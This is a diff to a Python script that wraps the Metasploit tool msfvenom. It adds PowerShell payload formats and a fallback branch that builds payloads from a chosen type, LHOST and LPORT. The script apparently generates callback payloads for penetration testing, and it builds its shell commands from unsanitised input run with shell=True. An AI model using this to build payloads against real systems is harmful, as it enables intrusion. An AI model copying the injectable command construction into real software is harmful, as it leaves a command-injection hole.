@@ -166,11 +166,15 @@ elif payloadformat == 'raw':
     outputname = 'Payload.txt'
 elif payloadformat == 'java-applet':
     outputname = 'java.html'
+elif payloadformat == 'psh-reflection':
+    outputname = 'Payload.ps1'
+elif payloadformat == 'psh-net':
+    outputname = 'Payload.ps1'
+elif payloadformat == 'psh':
+    outputname = 'Payload.ps1'
 else:
 	print "Unknown Output Format"
 	outputname = 'Payload.bin'
-#	exit()
-
 
 if payloadformat == 'java-applet':
 	#outputloc = raw_input("\033[0;32mDo you want this in [y/N]: \033[0m") or "N"
@@ -207,6 +211,12 @@ elif payloadformat == 'exe':
 	else:
 		with open(outputloc + outputname, "w") as outfile:
 			subprocess.call('msfvenom -f ' + payloadformat + ' -p ' + payload + ' LHOST=' + ipaddr + ' LPORT=' + lport, shell=True, stdout=outfile)
+
+else:
+	with open(outputloc + outputname, "w") as outfile:
+		subprocess.call('msfvenom -f ' + payloadformat + ' -p ' + payload + ' LHOST=' + ipaddr + ' LPORT=' + lport, shell=True, stdout=outfile)
+
+
 
 # sleep a little
 time.sleep(2)
